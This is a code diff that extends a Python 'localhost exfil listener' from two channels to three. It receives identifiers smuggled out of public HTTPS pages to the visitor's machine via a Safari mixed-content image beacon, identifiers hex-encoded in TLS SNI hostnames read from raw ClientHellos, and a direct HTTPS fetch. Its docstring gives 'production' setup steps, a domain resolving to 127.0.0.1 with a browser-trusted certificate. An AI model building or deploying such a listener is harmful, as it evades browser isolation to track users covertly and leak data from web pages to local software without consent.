@@ -1,22 +1,37 @@
 #!/usr/bin/env python3
 """
-Two-channel localhost exfil listener. No certificate required.
+Three-channel localhost exfil listener.
 
-Channel 1 — IMG (Safari only)
-  Browser loads: <img src="http://127.0.0.1:8765/track?id=<identifier>">
-  Safari allows HTTP images from localhost even from an HTTPS public origin
-  (passive mixed-content carve-out). The identifier travels in the query string.
+Channel 1 — IMG / HTTP  (Safari only, no cert)
+  <img src="http://127.0.0.1:8765/track?id=<identifier>">
+  Safari allows HTTP images from a public HTTPS page (passive mixed-content
+  carve-out). Identifier travels in the URL query string.
 
-Channel 2 — SNI (Safari + Chrome)
-  Browser fetches: https://id-<hex>.sni.localtest.me:9443/
-  The TLS ClientHello contains the hostname in plaintext before any cert check.
-  This raw TCP listener extracts it without completing the handshake.
+Channel 2 — TLS SNI  (Safari + Chrome, no cert)
+  fetch('https://id-<hex>.sni.localtest.me:9443/')
+  Identifier is hex-encoded into the SNI hostname. The raw ClientHello
+  arrives in plaintext before any certificate check. No TLS handshake
+  is completed; the browser sees a network error (expected).
+
+Channel 3 — HTTPS fetch  (Safari, requires valid cert)
+  fetch('https://<your-domain>:8443/track?id=<identifier>')
+  Full bidirectional HTTP over TLS. Safari places no gate on
+  HTTPS-to-localhost from a public HTTPS origin. The domain must resolve
+  to 127.0.0.1 and present a certificate trusted by the browser.
+
+  For local testing: copy localhost-cert.pem / localhost-key.pem from
+  safari-localhost-test/ (generated with mkcert + mkcert -install).
+  For production: register a domain, point its A record to 127.0.0.1,
+  and obtain a Let's Encrypt certificate. Any browser-trusted cert works.
 
 Usage:
-  python3 server.py
+  python3 server.py                            # channels 1 + 2 only
+  python3 server.py --cert cert.pem --key key.pem   # all three channels
+
+No external dependencies. Python 3.9+.
 """
 
-import argparse, socket, sys, threading
+import argparse, os, socket, ssl, sys, threading
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 
@@ -25,43 +40,51 @@ def ts():
     return datetime.now().strftime("%H:%M:%S.%f")[:-3]
 
 
-# ── Tiny 1×1 transparent PNG ─────────────────────────────────────────────────
 PNG = bytes.fromhex(
     "89504e470d0a1a0a0000000d494844520000000100000001080600000"
     "01f15c489000000017352474200aece1ce90000000d494441540"
     "78963600000000200017af4ed1d0000000049454e44ae426082"
 )
 
-CORS = {"Access-Control-Allow-Origin": "*", "Cache-Control": "no-store"}
+CORS_HEADERS = {
+    "Access-Control-Allow-Origin": "*",
+    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+    "Access-Control-Allow-Headers": "*",
+    "Access-Control-Expose-Headers": "*",
+    "Cache-Control": "no-store",
+}
 
 
-def http_response(status, headers, body=b""):
-    h = "\r\n".join(f"{k}: {v}" for k, v in {**headers,
-        "Content-Length": len(body), "Connection": "close"}.items())
-    return f"HTTP/1.1 {status}\r\n{h}\r\n\r\n".encode() + body
+def http_response(status, extra_headers, body=b""):
+    headers = {**CORS_HEADERS, **extra_headers, "Content-Length": len(body), "Connection": "close"}
+    head = "\r\n".join(f"{k}: {v}" for k, v in headers.items())
+    return f"HTTP/1.1 {status}\r\n{head}\r\n\r\n".encode() + body
 
 
-# ── Channel 1: HTTP IMG listener ──────────────────────────────────────────────
+def dispatch(raw, addr, scheme):
+    line = raw.split(b"\r\n")[0].decode("latin-1", errors="replace")
+    parts = line.split()
+    if len(parts) < 2:
+        return None
+    qs = parse_qs(urlparse(parts[1]).query)
+    identifier = qs.get("id", [None])[0]
+    if identifier is not None:
+        ch = "IMG " if scheme == "http" else "HTTPS"
+        print(f"\n[{ts()}] {ch}  src={addr[0]}:{addr[1]}")
+        print(f"  id = {identifier!r}")
+    body = f'{{"received":true,"id":{repr(identifier)}}}'.encode()
+    return http_response("200 OK", {"Content-Type": "application/json"}, body)
+
+
+# ── Channel 1: HTTP ───────────────────────────────────────────────────────────
 def handle_http(conn, addr):
     try:
         conn.settimeout(5.0)
         raw = conn.recv(4096)
         if not raw:
             return
-        line = raw.split(b"\r\n")[0].decode("latin-1", errors="replace")
-        parts = line.split()
-        if len(parts) < 2:
-            return
-        path = parts[1]
-        parsed = urlparse(path)
-        qs = parse_qs(parsed.query)
-        identifier = qs.get("id", [None])[0]
-
-        if identifier is not None:
-            print(f"\n[{ts()}] IMG  src={addr[0]}:{addr[1]}")
-            print(f"  id = {identifier!r}")
-
-        conn.sendall(http_response("200 OK", {**CORS, "Content-Type": "image/png"}, PNG))
+        resp = dispatch(raw, addr, "http")
+        conn.sendall(resp or http_response("200 OK", {"Content-Type": "image/png"}, PNG))
     except (socket.timeout, OSError):
         pass
     finally:
@@ -69,32 +92,27 @@ def handle_http(conn, addr):
         except OSError: pass
 
 
-def run_http(host, port):
+def run_http(port):
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind((host, port))
-    srv.listen(64)
-    print(f"[+] IMG  listener  http://{host}:{port}/track?id=...")
+    srv.bind(("0.0.0.0", port)); srv.listen(64)
+    print(f"[+] CH1  IMG/HTTP    0.0.0.0:{port}/track?id=...")
     while True:
         try:
             conn, addr = srv.accept()
             threading.Thread(target=handle_http, args=(conn, addr), daemon=True).start()
-        except OSError:
-            break
+        except OSError: break
 
 
-# ── Channel 2: raw TCP SNI listener ──────────────────────────────────────────
+# ── Channel 2: raw TCP SNI ────────────────────────────────────────────────────
 def parse_sni(data):
     try:
-        if len(data) < 5 or data[0] != 0x16:
+        if len(data) < 5 or data[0] != 0x16 or data[5] != 0x01:
             return None
-        pos = 9                                   # skip record header + handshake header
-        if data[5] != 0x01:
-            return None
-        pos += 2 + 32                             # version + random
-        sid = data[pos]; pos += 1 + sid           # session id
-        cs = int.from_bytes(data[pos:pos+2], "big"); pos += 2 + cs
-        cm = data[pos]; pos += 1 + cm
+        pos = 9 + 2 + 32
+        sid = data[pos]; pos += 1 + sid
+        cs  = int.from_bytes(data[pos:pos+2], "big"); pos += 2 + cs
+        cm  = data[pos]; pos += 1 + cm
         ext_end = pos + 2 + int.from_bytes(data[pos:pos+2], "big"); pos += 2
         while pos + 4 <= ext_end:
             t = int.from_bytes(data[pos:pos+2], "big")
@@ -131,7 +149,7 @@ def handle_sni(conn, addr):
         sni = parse_sni(data)
         if sni:
             decoded = decode_sni(sni)
-            print(f"\n[{ts()}] SNI  src={addr[0]}:{addr[1]}")
+            print(f"\n[{ts()}] SNI   src={addr[0]}:{addr[1]}")
             print(f"  hostname = {sni}")
             if decoded is not None:
                 print(f"  id       = {decoded!r}")
@@ -142,18 +160,52 @@ def handle_sni(conn, addr):
         except OSError: pass
 
 
-def run_sni(host, port):
+def run_sni(port):
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind((host, port))
-    srv.listen(64)
-    print(f"[+] SNI  listener  raw TCP {host}:{port}")
+    srv.bind(("0.0.0.0", port)); srv.listen(64)
+    print(f"[+] CH2  SNI/rawTCP  0.0.0.0:{port}")
     while True:
         try:
             conn, addr = srv.accept()
             threading.Thread(target=handle_sni, args=(conn, addr), daemon=True).start()
-        except OSError:
-            break
+        except OSError: break
+
+
+# ── Channel 3: HTTPS ─────────────────────────────────────────────────────────
+def handle_https(conn, addr):
+    try:
+        conn.settimeout(10.0)
+        raw = conn.recv(8192)
+        if not raw:
+            return
+        resp = dispatch(raw, addr, "https")
+        if resp:
+            conn.sendall(resp)
+    except (socket.timeout, OSError, ssl.SSLError):
+        pass
+    finally:
+        try: conn.close()
+        except OSError: pass
+
+
+def run_https(port, certfile, keyfile):
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    ctx.load_cert_chain(certfile, keyfile)
+    raw_srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    raw_srv.bind(("0.0.0.0", port)); raw_srv.listen(64)
+    print(f"[+] CH3  HTTPS       0.0.0.0:{port}/track?id=...  (cert: {certfile})")
+    while True:
+        try:
+            raw_conn, addr = raw_srv.accept()
+            try:
+                tls_conn = ctx.wrap_socket(raw_conn, server_side=True)
+            except ssl.SSLError:
+                raw_conn.close()
+                continue
+            threading.Thread(target=handle_https, args=(tls_conn, addr), daemon=True).start()
+        except OSError: break
 
 
 # ── Entry point ───────────────────────────────────────────────────────────────
@@ -162,10 +214,21 @@ def main():
     p = argparse.ArgumentParser()
     p.add_argument("--http-port", type=int, default=8765)
     p.add_argument("--sni-port",  type=int, default=9443)
+    p.add_argument("--tls-port",  type=int, default=8443)
+    p.add_argument("--cert", default="localhost-cert.pem")
+    p.add_argument("--key",  default="localhost-key.pem")
     args = p.parse_args()
 
-    threading.Thread(target=run_http, args=("0.0.0.0", args.http_port), daemon=True).start()
-    threading.Thread(target=run_sni,  args=("0.0.0.0", args.sni_port),  daemon=True).start()
+    threading.Thread(target=run_http, args=(args.http_port,), daemon=True).start()
+    threading.Thread(target=run_sni,  args=(args.sni_port,),  daemon=True).start()
+
+    if os.path.exists(args.cert) and os.path.exists(args.key):
+        threading.Thread(target=run_https,
+                         args=(args.tls_port, args.cert, args.key),
+                         daemon=True).start()
+    else:
+        print(f"[!] CH3  HTTPS skipped — cert/key not found ({args.cert} / {args.key})")
+        print(f"         Copy from safari-localhost-test/ or provide --cert / --key")
 
     print(f"[+] Ctrl-C to stop\n")
     try:
